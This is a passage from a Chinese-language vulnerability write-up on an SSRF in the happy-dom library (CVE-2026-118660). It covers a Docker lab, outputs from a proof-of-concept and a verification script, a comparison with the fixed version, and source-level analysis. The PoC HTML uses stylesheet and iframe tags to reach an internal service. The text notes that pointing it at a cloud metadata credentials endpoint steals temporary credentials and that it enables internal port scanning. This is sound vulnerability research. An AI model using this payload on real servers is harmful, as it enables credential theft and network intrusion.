rel=stylesheet&gt; 默认触发真实 HTTP 请求（CSS file loading） --&gt;\n  &lt;link rel=\"stylesheet\" href=\"http://intranet:3000/attacker-probe.css\"&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n  &lt;!-- 攻击向量 2：&lt;iframe src&gt; 默认加载目标页面（iframe page loading） --&gt;\n  &lt;iframe src=\"http://intranet:3000/secret/metadata\"&gt;&lt;/iframe&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre><p>实战中把 URL 换成 <code>http://xx.xx.xx.xx/latest/meta-data/iam/security-credentials/</code> 等即可窃取云临时凭证；把 URL 指向内网各地址、观察请求是否成功或超时，即可做内网端口扫描。</p><h3 id=\"sec-23\">3.5 漏洞版复现：happy-dom 20.14.6</h3><p>下面五步按实际执行顺序记录。每步同时给出可直接复制的命令、实测输出，以及同一次运行的终端整窗截图（图 3-2 ～ 图 3-6）——文字便于复制与检索，截图用于证明这段输出确实出自那次运行。</p><h4 id=\"sec-24\">① 构建并启动</h4><pre><code>cd ~/CVE-2026-118660-repro &amp;&amp; docker compose up -d --build\n</code></pre><p><code>HAPPY_DOM_VERSION</code> 未设置，取默认值 <code>20.14.6</code>。构建过程安装的正是漏洞版：</p><pre><code>[+] Building 6.8s (11/11) FINISHED\n =&gt; [1/4] FROM docker.io/library/node:22-alpine@sha256:fe4f6d74e203…\n =&gt; [2/4] WORKDIR /app\n =&gt; [3/4] RUN npm install --no-audit --no-fund \"happy-dom@20.14.6\"     4.5s\n =&gt; [4/4] COPY server.js server.js\n =&gt; naming to docker.io/cve-2026-118660/web:20.14.6\n\n[+] up 11/11\n ✔ Network cve-2026-118660_demo Created\n ✔ Container cve-2026-118660-intranet-1 Started\n ✔ Container cve-2026-118660-web-1 Started\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123616-9903e5bf-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=678aae1ad6a1a433\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-2　3.5① 构建并启动：</em><code>docker compose up -d --build</code>_ 未设 <code>HAPPY_DOM_VERSION</code>，装的是默认版本 20.14.6（图片：03-repro-05-build-vuln-01.png）_</p><h4 id=\"sec-25\">② 确认服务状态与版本</h4><pre><code>docker compose ps &amp;&amp; curl -s http://localhost:8080/healthz\n</code></pre><pre><code>NAME                        IMAGE                         STATUS          PORTS\ncve-2026-118660-intranet-1  node:22-alpine                Up 23 seconds\ncve-2026-118660-web-1       cve-2026-118660/web:20.14.6   Up 23 seconds   0.0.0.0:8080-&gt;3000/tcp, [::]:8080-&gt;3000/tcp\n\nok happy-dom@20.14.6\n</code></pre><p>注意 <code>intranet</code> 一行 <strong>PORTS 为空</strong>——\"不发布端口\"这一前提成立；<code>healthz</code> 确认当前跑的是 20.14.6。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123616-9985f155-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=58ea79feb728c901\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-3　3.5② </em><code>docker compose ps</code><em> 与 </em><code>/healthz</code><em>：只有 web 发布 8080，健康检查回 </em><code>ok happy-dom@20.14.6</code><em>（图片：03-repro-06-ps-01.png）</em></p><h4 id=\"sec-26\">③ 执行 PoC</h4><pre><code>./poc.sh\n</code></pre><p><code>poc.sh</code> 做三件事：打印提交的 PoC HTML → <code>curl -X POST</code> 把 <code>poc.html</code> 提交到 <code>/render</code> → 打印内网服务的 <code>[SSRF-HIT]</code> 日志。实测输出：</p><pre><code>[*] POST http://localhost:8080/render  (simulates server-side parsing of user-submitted HTML)\n[*] App response (iframe content is reflected back to the attacker):\n{\n  \"happyDomVersion\": \"20.14.6\",\n  \"iframeUrl\": \"http://intranet:3000/secret/metadata\",\n  \"iframeContent\": \"SECRET: INTERNAL-ONLY-TOKEN-ae603ffa1440d654 (cloud-metadata-like internal data)\",\n  \"error\": null\n}\n\n[*] Requests seen by the internal-only service:\nintranet-1  | [SSRF-HIT] 2026-11-05T08:18:17.050Z GET /attacker-probe.css | internal-only service reached!\nintranet-1  | [SSRF-HIT] 2026-11-05T08:18:17.053Z GET /secret/metadata    | internal-only service reached!\n</code></pre><p>证据解读：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>证据</p></th><th colspan=\"1\" rowspan=\"1\"><p>说明</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>[SSRF-HIT] … GET /attacker-probe.css</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>攻击向量 1 命中：<code>&lt;link rel=\"stylesheet\"&gt;</code> 触发 happy-dom 发起真实 CSS 请求</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>[SSRF-HIT] … GET /secret/metadata</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>攻击向量 2 命中：<code>&lt;iframe src&gt;</code> 触发 happy-dom 加载内网页面</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>iframeContent</code> 含 <code>SECRET: INTERNAL-ONLY-TOKEN-ae603ffa1440d654</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>内网响应体（机密 token）经受害应用回显，泄露给攻击者 —— 对应 CVSS <strong>C:H</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>两次命中时间仅相差 3ms</p></td><td colspan=\"1\" rowspan=\"1\"><p>两个向量在<strong>同一次</strong> HTML 解析中并发触发，无需任何额外配置</p></td></tr></tbody></table><p>攻击者自始至终只访问了 <code>localhost:8080</code>（唯一可达入口），却拿到了<strong>从未直接连接过的</strong>内网服务里的机密数据。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1219%2F14fd6325-0b1.png&amp;mode=full&amp;exp=1794787200&amp;sig=2f9b826e70f9cb3e\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 3-4　3.5③ </em><code>./poc.sh</code><em>：一次提交同时打出两条 </em><code>[SSRF-HIT]</code><em>，</em><code>iframeContent</code>_ 回显内网 token（图片：03-repro-07-poc-vuln-01.png）_</p><h4 id=\"sec-27\">④ 核对内网服务完整日志</h4><pre><code>docker compose logs intranet\n</code></pre><pre><code>intranet-1  | [intranet] internal-only service on :3000; NOT published to host; secret token: INTERNAL-ONLY-TOKEN-ae603ffa1440d654\nintranet-1  | [SSRF-HIT] 2026-11-05T08:18:17.050Z GET /attacker-probe.css | internal-only service reached!\nintranet-1  | [SSRF-HIT] 2026-11-05T08:18:17.053Z GET /secret/metadata    | internal-only service reached!\n</code></pre><p>服务启动时打印的 secret token 为 <code>INTERNAL-ONLY-TOKEN-ae603ffa1440d654</code>，与攻击者响应中 <code>iframeContent</code> 里的 token <strong>完全一致</strong>——\"内网机密 → 攻击者\"的完整证据闭环由此成立。</p><p><strong>至此，漏洞版复现成功：内网服务收到 2 次请求（stylesheet + iframe），机密数据回显攻击者。</strong></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1225%2Fde107223-ca0.png&amp;mode=full&amp;exp=1794787200&amp;sig=aa5835abd26ad6df\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 3-5　3.5④ </em><code>docker compose logs intranet</code><em>：启动行 token 与两条命中来自同一次运行（图片：03-repro-08-logs-vuln-01.png）</em></p><h4 id=\"sec-28\">⑤ 清理环境</h4><pre><code>docker compose down\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123617-99ef6af2-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=6a2b02cfde1c6e01\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-6　3.5⑤ </em><code>docker compose down</code><em>：漏洞版容器与网络被移除（图片：03-repro-09-down-vuln-01.png）</em></p><h3 id=\"sec-29\">3.6 修复版对照：happy-dom 21.0.0</h3><p>同一份 <code>poc.html</code>、同一套命令，只换一个环境变量：</p><pre><code>HAPPY_DOM_VERSION=21.0.0 docker compose up -d --build\n</code></pre><pre><code> =&gt; [3/4] RUN npm install --no-audit --no-fund \"happy-dom@21.0.0\"     4.7s\n =&gt; naming to docker.io/cve-2026-118660/web:21.0.0\n\n[+] up 4/4\n ✔ Image cve-2026-118660/web:21.0.0      Built\n ✔ Container cve-2026-118660-intranet-1  Started\n ✔ Container cve-2026-118660-web-1       Started\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123618-9a71f540-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=9920342acea4e991\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-7　3.6 只换 </em><code>HAPPY_DOM_VERSION=21.0.0</code><em>：构建出 </em><code>cve-2026-118660/web:21.0.0</code><em>（图片：03-repro-10-build-fixed-01.png）</em></p><p>再跑一次 PoC：</p><pre><code>[*] App response (iframe content is reflected back to the attacker):\n{\n  \"happyDomVersion\": \"21.0.0\",\n  \"iframeUrl\": null,\n  \"iframeContent\": null,\n  \"error\": null\n}\n\n[*] Requests seen by the internal-only service:\n(none)\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123619-9af545cf-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=61dfc359ac50441f\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-8　3.6 同一份 </em><code>poc.sh</code><em> 在 21.0.0 下：</em><code>iframeUrl</code>_ / <code>iframeContent</code> 均为 <code>null</code>，命中 <code>(none)</code>（图片：03-repro-11-poc-fixed-01.png）_</p><p>与漏洞版逐项对比：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>观测点</p></th><th colspan=\"1\" rowspan=\"1\"><p>20.14.6（漏洞版）</p></th><th colspan=\"1\" rowspan=\"1\"><p>21.0.0（修复版）</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>内网服务收到请求</p></td><td colspan=\"1\" rowspan=\"1\"><p>2 次（css + iframe）</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>0 次（</strong><code>(none)</code><strong>）</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>iframeUrl</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>http://intranet:3000/secret/metadata</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>null</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>iframeContent</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>含内网机密 token</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>null</code></p></td></tr></tbody></table><p>再看两边的日志：</p><pre><code>intranet-1  | [intranet] internal-only service on :3000; NOT published to host; secret token: INTERNAL-ONLY-TOKEN-a2b060836c39c313\nweb-1  | [web] listening on :3000 | happy-dom@21.0.0 | DEFAULT browser settings (no opt-out flags)\nweb-1  | [web] received untrusted HTML (363 bytes) -&gt; parsing with happy-dom@21.0.0 DEFAULT settings (no opt-out flags)\nweb-1  | [web] iframe content reflected to caller: null\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123620-9b6ee1d7-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=a45369d9f3a9c13a\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-9　3.6 修复版两侧日志：web 仍是 </em><code>DEFAULT settings</code><em>，intranet 无 </em><code>[SSRF-HIT]</code><em>（图片：03-repro-12-logs-fixed-01.png）</em></p><p>两个细节值得注意：</p><ul><li><p><code>web</code> 应用日志明确显示解析时仍是 <code>DEFAULT settings</code>——<strong>受害应用代码一行未改</strong>，仅升级 happy-dom，行为就从\"代发内网请求\"变成\"静默不加载\"。这说明变化发生在库的默认值层面，而不是应用侧的配置；</p></li><li><p>本次 <code>intranet</code> 启动生成的 token 是<strong>新的</strong>（<code>a2b060836c39c313</code>），与上一轮不同，排除了\"旧日志 / 旧响应拼凑\"的可能。</p></li></ul><h3 id=\"sec-30\">3.7 一键端到端验证</h3><p>手动对照之外，<code>verify.sh</code> 把整个流程自动化并做严格断言：</p><pre><code>./verify.sh\n</code></pre><p>脚本用 <code>run_phase</code> 跑两个阶段，共 4 项断言：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>阶段</p></th><th colspan=\"1\" rowspan=\"1\"><p>版本</p></th><th colspan=\"1\" rowspan=\"1\"><p>断言 1</p></th><th colspan=\"1\" rowspan=\"1\"><p>断言 2</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Phase 1</p></td><td colspan=\"1\" rowspan=\"1\"><p>20.14.6</p></td><td colspan=\"1\" rowspan=\"1\"><p>内网服务 <code>[SSRF-HIT]</code> 次数 <strong>&gt;= 2</strong>（iframe + stylesheet 均抵达）</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>当次启动的</strong> secret token 出现在攻击者响应中（token 关联断言）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Phase 2</p></td><td colspan=\"1\" rowspan=\"1\"><p>21.0.0</p></td><td colspan=\"1\" rowspan=\"1\"><p>内网服务收到 <strong>0</strong> 次请求</p></td><td colspan=\"1\" rowspan=\"1\"><p>响应中<strong>不含</strong> <code>INTERNAL-ONLY-TOKEN</code> 字样</p></td></tr></tbody></table><p>实测输出（节选）：</p><pre><code>==================================================================\n Phase: happy-dom@20.14.6\n==================================================================\n[+] stack up: ok happy-dom@20.14.6\n[*] app response:\n{\n  \"happyDomVersion\": \"20.14.6\",\n  \"iframeUrl\": \"http://intranet:3000/secret/metadata\",\n  \"iframeContent\": \"SECRET: INTERNAL-ONLY-TOKEN-d89e89828f8933ab (cloud-metadata-like internal data)\",\n  \"error\": null\n}\n[*] internal-only service received 2 request(s)\n[PASS] SSRF triggered: iframe + stylesheet 均抵达内网专用服务\n[PASS] 内网机密 token 经 iframe 回显给攻击者（对应 CVSS C:H 危害）\n\n==================================================================\n Phase: happy-dom@21.0.0\n==================================================================\n[+] stack up: ok happy-dom@21.0.0\n[*] app response:\n{\n  \"happyDomVersion\": \"21.0.0\",\n  \"iframeUrl\": null,\n  \"iframeContent\": null,\n  \"error\": null\n}\n[*] internal-only service received 0 request(s)\n[PASS] 修复版无 SSRF：内网专用服务收到 0 次请求\n[PASS] 修复版响应中无内网数据\n\n==================================================================\n RESULT: 4 passed, 0 failed\n VERDICT: CVE-2026-118660 复现成功（漏洞版触发 SSRF，修复版不触发）\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123621-9c04445f-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=a2bf65f7456b17c2\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-10　3.7 </em><code>./verify.sh</code><em> 第 1 页：Phase 20.14.6 的构建与启动（图片：03-repro-13-verify-01.png）</em></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1228%2F0789c9ed-2c8.png&amp;mode=full&amp;exp=1794787200&amp;sig=2217c0478458c468\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 3-11　3.7 第 2 页：漏洞版两项断言通过，进入 Phase 21.0.0（图片：03-repro-13-verify-02.png）</em></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123622-9ca48b64-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=2d64d208b3968429\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 3-12　3.7 第 3 页：修复版 0 次请求，</em><code>RESULT: 4 passed, 0 failed</code><em>（图片：03-repro-13-verify-03.png）</em></p><p>token 关联断言的实现方式：从当次 <code>docker compose logs intranet</code> 里提取启动行的 <code>secret token: INTERNAL-ONLY-TOKEN-…</code>，再检查这个值是否出现在攻击者响应中。本轮 token 为 <code>d89e89828f8933ab</code>，与前两轮手动实验的值都不同（每轮容器重建都会重新生成），证明断言针对的是当次真实流量，而不是缓存的旧输出。</p><h3 id=\"sec-31\">3.8 这套复现方法的三个要点</h3><p>复现本身不复杂，但要让结论站得住，有三件事不能省：</p><ul><li><p><strong>靶标不可直达</strong>。内网服务不发布端口，是\"请求由库发出\"这个结论的前提。如果攻击者能自己访问靶标，日志就无法归因。</p></li><li><p><strong>证据分三层</strong>：对端日志（有没有出网）、应用响应（有没有数据泄露）、token 关联（是不是这一次）。只给其中一层，都留得下\"巧合\"的解释空间。</p></li><li><p><strong>对照必须同源</strong>。修复版只换了 <code>HAPPY_DOM_VERSION</code>，PoC、应用代码、网络拓扑全部不变。这样\"2 次 → 0 次\"才能归因到版本，而不是环境差异。</p></li></ul><p>下一章回到代码，回答一个复现没有回答的问题：这段 HTML 到底是在哪一行、因为什么机制，变成了这次请求。</p><hr><h2 id=\"sec-32\">四、主要函数的作用与原理：从一段 HTML 到一次请求</h2><p>在服务端把不可信 HTML 交给 happy-dom，<code>page.content = html</code> 这一行执行完，请求往往已经上路了。这条链很长，但真正决定\"会不会出网、出到哪、响应去了哪\"的只有十来个函数。</p><p>下面按调用顺序走一遍：先看两条路径共用的解析层（4.1–4.3）和网络层（4.4–4.5），再看 <code>&lt;link&gt;</code> 与 <code>&lt;iframe&gt;</code> 分别如何把\"元素出现\"翻译成\"发起请求\"，以及响应最终落在哪里（4.6–4.7）。</p><p>行号均相对 <code>packages/happy-dom/src/</code>，版本为 20.14.6。</p><h3 id=\"sec-33\">4.1 字符串变成文档：<code>BrowserFrame.content</code> setter</h3><p>一切从一次赋值开始。这个 setter 只有几行，但它做的不是\"替换一段 HTML\"，而是\"重建一个文档\"：</p><pre><code>public set content(content) {\n    this.window.document[PropertySymbol.isFirstWrite] = true;\n    this.window.document[PropertySymbol.isFirstWriteAfterOpen] = false;\n    this.window.document.open();\n    this.window.document.write(content);\n}\n</code></pre><p>它实际做了三件事：</p><ol><li><p>置上\"首次写入\"标记，让随后的 <code>write()</code> 走\"以 Document 为根\"的分支，而不是以 <code>body</code> 为根；</p></li><li><p>调用 <code>open()</code>：移除 document 上全部冒泡与捕获监听器，删掉所有子节点，重建 <code>&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;</code>。重建过程本身走 <code>appendChild → connectedToNode</code>，所以新的 <code>html/head/body</code> 一建出来就是已连接的；</p></li><li><p>调用 <code>write(content)</code>：启动 <code>HTMLParser</code>。不可信字符串从这一刻起变成 DOM。</p></li></ol><p><code>content</code> 是纯字符串，没有类型约束、没有净化、也没有任何\"可信 / 不可信\"的标记。应用以为自己只是在\"设置页面内容\"，库理解的却是\"重建文档并解析\"。两边对\"这会触发外部资源加载\"没有共同认知——这是语义上的错配，不是某一行写错了。</p><p>有三个容易踩的细节。</p><p><strong>它同步，但副作用不同步。</strong> 解析在调用栈内完成，网络副作用发生在解析触发的连接回调里。setter 返回时请求尚未发出，实测同步耗时只有 0–2 ms，请求出现在之后几毫秒。所以\"这一行很快就返回了\"不能推出\"没有发请求\"。</p><p><strong>它会清掉监听器，而且不可逆。</strong> <code>open()</code> 移除 document 级监听器之后不会恢复。应用如果在赋值前挂了 document 级监听，写入后全部失效——这也是动态分析要改成元素级监听的原因。</p><p><strong>它不是唯一的入口。</strong> 除了给整个文档赋值，不可信 HTML 还能从好几个地方进来。与其把 API 一个个列出来背，不如按\"元素是在什么时候被连接的\"分三类看：</p><p><strong>第一类：写进已经连接的位置。</strong> <code>page.content</code>、已连接元素的 <code>innerHTML</code>、<code>insertAdjacentHTML</code>、<code>shadowRoot.innerHTML</code> 都属于这一类。解析结果一插入就已经在文档里，元素当场连接，所以同一个调用里就会把请求发出去。这也是\"赋值立刻出网\"的那一类。</p><p><strong>第二类：先解析，后挂载。</strong> 比如先给一个游离的 <code>div</code> 设 <code>innerHTML</code>，再把 <code>div</code> 挂到页面上；或者用 <code>DOMParser</code> 先解析出一份新文档，再把节点 <code>importNode</code> 进去。解析的时候元素没有父节点，什么都不会发生；挂载的那一刻才连接，请求也出现在那一刻。<code>DOMParser</code> 这条路要算两次：解析进新文档时一次，导入并挂载时再一次。</p><p><strong>第三类：惰性内容，等它被\"实体化\"。</strong> <code>&lt;template&gt;</code> 里的内容会被解析，但结果存在一份独立的文档片段里，里面的节点永远不连接，所以不会发请求；把 <code>template.content</code> 克隆出来挂进文档，它就变成了第一类，立刻触发。</p><p>三类看完，结论其实只有一句：决定请求的从来不是\"用了哪个 API 写 HTML\"，而是\"元素有没有连上\"。所以真正需要记住的条件是——不可信 HTML 进入 <code>HTMLParser</code>，并且解析出的元素最终被连接。反过来，<code>&lt;template&gt;</code> 那种\"不触发\"也不能读成\"安全\"，它只是\"还没连上\"。</p><p>顺带排除一个常见的误读。<code>HTMLParser</code> 里确实有一段\"innerHTML 不执行脚本\"的镜像逻辑，会给 <code>&lt;link&gt;</code> 设 <code>disableEvaluation</code>，但那段代码位于 rawText 元素的处理路径上，而 <code>&lt;link&gt;</code> 的内容模型是\"不允许后代\"，常规命名空间下根本走不到。所以 <code>innerHTML</code> 注入的 <code>&lt;link&gt;</code> 照样出网，这个标志对 <code>&lt;link&gt;</code> 不构成任何闸门。</p><h3 id=\"sec-34\">4.2 属性先写、元素后入树：<code>HTMLParser.parseEndOfStartTag</code></h3><p>解析器处理每个开始标签时，都会经过这个函数。它把工作分成两段：先处理属性，再把元素挂进树。</p><pre><code>// 属性段\nconst value = rawValue ? XMLEncodeUtility.decodeHTMLAttributeValue(rawValue) : '';\nconst attributes = this.nextElement![PropertySymbol.attributes];\n...\n} else if (!attributes.getNamedItem(name)) {\n    const attributeItem = this.rootDocument!.createAttribute(name);\n    attributeItem[PropertySymbol.value] = value;\n    attributes[PropertySymbol.setNamedItem](attributeItem);\n}\n\n// 入树段\nbody[PropertySymbol.appendChild](this.nextElement!, true);\n</code></pre><p>这里最容易误读的一跳是：解析器<strong>没有</strong>调用 <code>element.setAttribute</code>，而是直接构造 <code>Attr</code> 塞进 <code>NamedNodeMap</code>。看上去\"绕过 setter\"就等于\"绕过回调\"，但 <code>setNamedItem</code> 的第二个参数 <code>ignoreListeners</code> 默认是 <code>false</code>，它照样会调用 <code>ownerElement</code> 上的属性写入回调。</p><p>于是就出现了那个让人困惑的现象：</p><ul><li><p>属性阶段<strong>确实</strong>调用了加载函数——<code>&lt;link&gt;</code> 的样式表加载、<code>&lt;iframe&gt;</code> 的页面加载，都被调了一次；</p></li><li><p>但此时元素还没入树，<code>isConnected</code> 是 <code>false</code>，加载函数在门口就静默返回了；</p></li><li><p>真正让它生效的，是入树段的 <code>appendChild(..., true)</code>——元素连接，连接回调分派到子类，请求才发起。</p></li></ul><p>这解释了一组看似矛盾的事实：\"解析会触发请求\"和\"写属性不会触发请求\"同时成立。前者说的是入树之后，后者说的是入树之前。</p><p>三个细节值得记住：</p><p><strong>属性顺序无关。</strong> 先 <code>rel</code> 后 <code>href</code>，写 <code>href</code> 时检查一次；先 <code>href</code> 后 <code>rel</code>，写 <code>rel</code> 时再检查一次。两次都发生在未连接期，都早退，最终结果都是连接后发一次请求。</p><p><strong>同名属性只取第一个。</strong> <code>!attributes.getNamedItem(name)</code> 让重复属性天然 first-wins。这对解析器是规范行为，对\"用正则取最后一个值\"的朴素检查器就是解析差异：<code>&lt;link rel=\"stylesheet\" rel=\"preload\" href=...&gt;</code> 在 happy-dom 眼里是样式表，在检查器眼里可能被当成 preload。</p><p><strong>属性值会做实体解码。</strong> <code>decodeHTMLAttributeValue</code> 会把 <code>&amp;#x2e;</code> 还原成 <code>.</code>。粗粒度的字符串黑名单因此在解码前就被绕过了。这不是 happy-dom 的缺陷，而是\"检查发生在解码之前\"的通用问题。</p><p>这个函数本身不是修复点，但它是一条分界线：在它之前，<code>&lt;link&gt;</code> 只是文本；在它之后，<code>&lt;link&gt;</code> 是一个有行为、会去取资源的元素。任何\"解析期禁止加载\"的方案，都必须在这里或下一节那个函数上生效。</p><h3 id=\"sec-35\">4.3 连接即加载：<code>Node.[connectedToNode]</code></h3><p>解析器只负责把元素挂到树上，它从不直接说\"去加载资源\"。加载是由连接状态的变化触发的，这个判断集中在 <code>Node</code> 的 <code>connectedToNode</code> 方法里。</p><pre><code>public [PropertySymbol.connectedToNode](): void {\n    const parentNode = this[PropertySymbol.parentNode];\n    const parent = parentNode || (&lt;any&gt;this)[PropertySymbol.host];\n    let isConnected = false;\n    let isDisconnected = false;\n\n    if (!this[PropertySymbol.isConnected] &amp;&amp; parent[PropertySymbol.isConnected]) {\n        this[PropertySymbol.isConnected] = true;\n        isConnected = true;\n    } else if (this[PropertySymbol.isConnected] &amp;&amp; !parent[PropertySymbol.isConnected]) {\n        this[PropertySymbol.isConnected] = false;\n        isDisconnected = true;\n    }\n    ...\n    const childNodes = this[PropertySymbol.nodeArray].slice();\n    for (let i = 0, max = childNodes.length; i &lt; max; i++) {\n        childNodes[i][PropertySymbol.parentNode] = self;\n        childNodes[i][PropertySymbol.connectedToNode]();     // 先子后父\n    }\n    ...\n    if (isConnected) {\n        this[PropertySymbol.connectedToDocument]();\n    } else if (isDisconnected) {\n        this[PropertySymbol.disconnectedFromDocument]();\n    }\n}\n</code></pre><p>按顺序看，它做了五件事：</p><ol><li><p>取父节点（没有父节点就看 shadow host）——没有父节点就谈不上连接；</p></li><li><p>做边沿检测，只在 <code>false → true</code> 或 <code>true → false</code> 时置标志；</p></li><li><p>向下传播 <code>ownerDocument</code>、<code>window</code>、<code>rootNode</code> 等上下文，让子类钩子能拿到窗口去查配置；</p></li><li><p>递归处理整棵子树，而且是先子后父；</p></li><li><p>在边沿上分派 <code>connectedToDocument()</code> 或 <code>disconnectedFromDocument()</code>，多态落到具体的元素类。</p></li></ol><p>它的关键性质是\"策略无关\"：这个函数不知道子类是谁，也不知道连接回调会做什么，它只负责通知\"状态变了\"。对浏览器，这是正确的生命周期抽象；对服务端解析场景，它意味着<strong>任何</strong>元素只要覆写连接回调并决定发请求，解析就会产生 I/O。</p><p>由此可以直接推出三条结论：</p><ul><li><p><strong>幂等。</strong> 对已连接的元素重复 <code>appendChild</code> 不会再次分派，所以同一个 <code>&lt;link&gt;</code> 不会因为重复挂载而重复请求。</p></li><li><p><strong>可重入。</strong> 先 <code>remove()</code> 再 <code>append()</code>，会经历一次断开和一次连接，于是会再加载一次。通过 <code>removeAttribute('src')</code> 再设回去，也能得到第二次请求。</p></li><li><p><strong>顺序只影响时机，不影响结果。</strong> 子树是递归处理的，所以\"先建一整块游离 DOM、最后一次性挂载\"同样会触发，请求就出现在挂载那一刻。</p></li></ul><p>另外，它是用计算属性名定义的方法，源码里不会以 <code>connectedToNode()</code> 这种普通调用形式出现，按方法名去搜索或按普通方法整理调用关系时都容易漏掉它。所以\"调用关系里看不到这条边\"不等于\"它不会执行\"，确认它只能靠动态栈和时序日志。</p><h3 id=\"sec-36\">4.4 一路绿灯的安检：<code>Fetch.send</code></h3><p>请求真正发出之前，会经过 <code>Fetch.send</code>。这个函数几乎把浏览器该有的机制都实现了一遍——referrer 整理、请求头、拦截器、协议校验、中止信号、<code>data:</code> 处理、Mixed Content、缓存、预加载、虚拟服务器、CORS——十三道检查，看着十分完整。</p><pre><code>public async send(): Promise&lt;Response&gt; {\n    FetchRequestReferrerUtility.prepareRequest(new URL(this.#window.location.href), this.request);\n    if (this.requestHeaders) { ... }\n    if (this.interceptor?.beforeAsyncRequest) { ... }\n    FetchRequestValidationUtility.validateSchema(this.request);\n    if (this.request.signal[PropertySymbol.aborted]) { ... }\n    if (this.request[PropertySymbol.url].protocol === 'data:') { ... }\n    if (http &amp;&amp; window.https) { throw MixedContent; }\n    if (!this.disableCache) { ... }\n    if (!this.disablePreload) { ... }\n    if (virtualServerResponse) { return ...; }\n    if (!this.disableSameOriginPolicy) { ... CORS ... }\n    return await this.sendRequest();\n}\n</code></pre><p>这些检查按顺序走下来，可以分成三组。</p><p>前几道在把请求整理成能直接发出去的样子：请求对象必过，referrer 按 <code>strict-origin-when-cross-origin</code> 整理，自定义请求头默认 <code>null</code>，拦截器默认 <code>null</code>，协议校验只放行 <code>data:/http:/https:</code>（<code>file:</code> 之类直接拒绝）。这几道里，只有协议校验会拦人。</p><p>中间几道是浏览器的特例处理：中止信号默认未触发；<code>data:</code> 走 <code>DataURIParser</code>，不产生网络；Mixed Content 只在 https 页面访问 http 目标时抛错；响应缓存按 page 级判断，命中就不出网；预加载在样式表路径被显式关掉；虚拟服务器默认 <code>null</code>，不映射到本地文件。</p><p>最后两道才决定走向：CORS 因为逐请求传进来的 <code>true</code> 被整段跳过，然后无条件走到 <code>sendRequest</code>。</p><p>一路读下来会发现一个结构性的事实：这里实现的都是\"浏览器语义\"，唯独没有实现\"目标可信\"。referrer、CORS、缓存、预加载、Mixed Content 一应俱全，但没有一条在问\"这个 host 是不是内网、这个端口该不该连、这个 scheme 允不允许发\"。这不是遗漏，而是设计目标不同——happy-dom 假设自己身处浏览器，目标由页面作者选择，它没有\"服务端代理\"这个威胁模型。</p><p>有三点需要单独说明。</p><p><strong>CORS 拦的不是\"发请求\"，而是\"读响应\"。</strong> 即便把同源策略恢复成开启，请求也已经到达目标了，预检的 <code>OPTIONS</code> 